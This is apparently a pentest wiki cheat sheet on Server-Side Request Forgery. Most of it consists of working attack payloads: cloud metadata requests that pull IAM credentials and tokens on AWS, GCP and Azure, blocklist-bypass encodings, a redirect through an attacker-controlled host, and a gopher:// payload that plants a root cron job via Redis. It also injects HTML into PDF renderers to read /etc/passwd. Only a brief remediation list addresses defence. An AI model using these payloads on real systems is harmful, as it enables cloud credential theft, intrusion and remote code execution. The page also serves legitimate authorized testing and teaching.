---
tags:
  - Web
  - Cloud
---

# :material-server-network: Server-Side Request Forgery (SSRF)

<span class="pill pill-hard">cloud killer</span> <span class="pill pill-info">web</span> <span class="pill pill-info">cloud</span>

**SSRF** tricks the server into making HTTP (or other protocol) requests to a destination *you* choose. On cloud infrastructure this is frequently game-over, because the server can reach the **metadata service** and internal-only systems you can't.

!!! abstract "TL;DR"
    Find a feature that fetches a URL (webhook, PDF/HTML renderer, image proxy, URL preview, XML parser). Point it inward — `127.0.0.1`, internal hosts, and above all the cloud metadata IP `169.254.169.254`.

## :material-magnify: Where to look

- URL/webhook fields, "import from URL", avatar-by-URL.
- PDF/screenshot/HTML-to-image renderers (headless Chromium).
- XML input (see XXE), file parsers, SVG uploads.
- Any parameter containing a `url=`, `next=`, `dest=`, `feed=`, `host=`, `path=`.

Point them at a listener you control first to confirm the callback:

```bash
# Any of these work as an out-of-band canary:
python3 -m http.server 80
# or use Burp Collaborator / interactsh
interactsh-client
```

## :material-cloud-lock: The cloud metadata jackpot

<span class="pill pill-hard">#1 payoff</span>

=== "AWS (IMDSv1)"

    ```http
    GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
    GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
    ```
    The second call returns `AccessKeyId`, `SecretAccessKey`, and `Token`.

=== "AWS (IMDSv2)"

    IMDSv2 needs a `PUT` to get a token first — hard via basic SSRF, but if the SSRF lets you set method/headers:
    ```http
    PUT /latest/api/token   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
    GET /latest/meta-data/... Header: X-aws-ec2-metadata-token: <token>
    ```

=== "GCP"

    ```http
    GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    Header required: Metadata-Flavor: Google
    ```

=== "Azure"

    ```http
    GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
    Header required: Metadata: true
    ```

!!! loot "You just stole cloud credentials"
    Those tokens go straight into the CLI. Then enumerate what they can do:
    ```bash
    aws sts get-caller-identity
    ```
    Continue in [AWS](../cloud/aws.md) / [Azure](../cloud/azure.md) / [GCP](../cloud/gcp.md).

## :material-shield-off: Filter bypasses

When a naive blocklist tries to stop `127.0.0.1` / `169.254.169.254`:

```text
# Alternate localhost representations
http://127.1/            http://0/              http://0177.0.0.1/
http://2130706433/       (decimal 127.0.0.1)   http://[::1]/
http://127.0.0.1.nip.io/                        http://localhost/

# Metadata IP obfuscation
http://169.254.169.254   -> http://0xA9FEA9FE/  -> http://2852039166/

# DNS rebinding / attacker-controlled domain resolving to 169.254.169.254
http://your-rebind-domain/

# Confuse the parser (userinfo trick)
http://expected-host@169.254.169.254/
http://169.254.169.254#@expected-host/

# Redirect: your server 302s to the internal target
http://ATTACKER/redirect -> Location: http://169.254.169.254/...
```

!!! tip "Protocol smuggling"
    If the fetcher supports more than HTTP, try `file://`, `gopher://` (craft raw TCP → hit Redis/SMTP/internal HTTP), and `dict://`. `gopher://` turns a blind SSRF into arbitrary-request SSRF.

## :material-lan-connect: Internal recon via SSRF

Even without cloud, use the server as a proxy to map the internal network:

```bash
# Port-scan by observing timing/error differences
http://127.0.0.1:6379/   # Redis
http://127.0.0.1:9200/   # Elasticsearch
http://127.0.0.1:8080/   # internal admin panels
http://127.0.0.1:2375/   # Docker API -> container escape
```

## :material-alert-decagram: Edge cases & gotchas

=== "Blind SSRF"

    No response body reflected? You can still win:

    - **Timing oracle** — an open internal port responds fast; a filtered one
      hangs to timeout. Diff the response times to port-scan.
    - **Force an interaction** — point it at cloud metadata and exfil via a
      *second* SSRF hop, or use `gopher://` to fire a complete request blind.
    - **Error-message leaks** — "connection refused" vs "no route to host" vs a
      TLS error each tell you something about the target.

=== "gopher:// → RCE"

    `gopher://` lets you write raw bytes to a TCP socket — turn blind SSRF into a
    crafted request against an unauthenticated internal service. Classic: drop a
    cron job via Redis.

    ```text
    gopher://127.0.0.1:6379/_%0D%0ASET%20x%20"...cronjob..."%0D%0ACONFIG%20SET%20dir%20/var/spool/cron%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASAVE%0D%0A
    ```

    URL-encode CRLFs as `%0D%0A`. `gopherus` generates these payloads for
    Redis / MySQL / SMTP / FastCGI (php-fpm → RCE).

=== "More metadata endpoints"

    | Cloud | Endpoint | Required header |
    | --- | --- | --- |
    | AWS | `169.254.169.254/latest/meta-data/` | none (v1) / token (v2) |
    | GCP | `metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
    | Azure | `169.254.169.254/metadata/instance` | `Metadata: true` |
    | DigitalOcean | `169.254.169.254/metadata/v1/` | none |
    | Oracle OCI | `169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` |
    | Alibaba | `100.100.100.200/latest/meta-data/` | none |

    GCP/Azure/Oracle need a **custom header** — a pure `url=` SSRF can't reach
    them unless the fetcher also lets you inject headers (or you chain CRLF
    injection).

!!! bug "Why the filter bypass isn't working"
    - **The app re-resolves DNS** between its check and its fetch — that's the
      DNS-rebinding window. If it validates the *literal string* instead, a decimal
      or hex IP slips through; if it validates the *resolved IP once*, rebinding
      (TTL 0) beats it.
    - **`http://expected@169.254.169.254/`** — some parsers read the host as
      `expected`, some as the metadata IP. Try both orderings and the `#@` variant.
    - **Redirects:** if the fetcher follows 3xx, host a `/redirect` that 302s to
      the internal target — the *first* URL passes the allowlist. Break this by
      disabling redirects server-side.
    - **IPv6:** `[::1]`, `[::ffff:169.254.169.254]` (IPv4-mapped), and
      `[0:0:0:0:0:ffff:a9fe:a9fe]` dodge IPv4-only blocklists.
    - **`0.0.0.0`** often routes to localhost on Linux and is missed by blocklists
      that only list `127.0.0.1`.
    - **CRLF in the URL** (`%0d%0a`) can inject extra headers or smuggle a second
      request into the fetcher.

!!! tip "PDF / screenshot renderers"
    HTML-to-PDF (wkhtmltopdf, headless Chrome) fetch resources *at render time*.
    Inject `<iframe src="http://169.254.169.254/...">`, `<img>`, or
    `<script>fetch('file:///etc/passwd').then(...)</script>` into any field that
    lands in the generated document — the render engine is your SSRF client, often
    with `file://` access.

## :material-shield-check: Remediation

- Allowlist destinations; resolve + validate the IP **after** DNS (guard against rebinding).
- Block link-local (`169.254.0.0/16`), loopback, and RFC1918 ranges at the egress.
- Enforce **IMDSv2** and hop-limit 1 on AWS; require metadata headers everywhere.
- Don't follow redirects in server-side fetchers.

## :material-link-variant: Related

- The direct on-ramp to [Cloud](../cloud/index.md) — this is how most cloud pentests start.
- Overlaps with XXE and [Deserialization](deserialization.md) as SSRF vectors.
- Reference: [PortSwigger SSRF](https://portswigger.net/web-security/ssrf).
